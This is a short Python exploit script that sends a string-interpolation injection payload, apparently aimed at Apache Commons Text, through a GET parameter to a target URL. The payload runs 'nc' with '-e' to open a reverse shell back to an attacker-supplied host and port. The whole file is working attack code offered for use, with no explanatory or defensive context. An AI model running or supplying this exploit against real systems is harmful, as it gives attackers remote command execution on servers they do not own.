import requests
import sys

if(len(sys.argv) != 6):
        print("Usage: python3 exploit.py <URL> <PARAM_NAME> <LHOST> <LPORT> <SHELL_TYPE>")
        sys.exit(0)

URL = sys.argv[1]
param_name = sys.argv[2]
lhost = sys.argv[3]
lport = sys.argv[4]
type = sys.argv[5]

cmd = "nc " + lhost + " " + lport + " -e " + type
payload="${script:javascript:java.lang.Runtime.getRuntime().exec('" + cmd + "')}"

PARAMS = {param_name:payload}

r = requests.get(url = URL, params = PARAMS)
print(r.text)
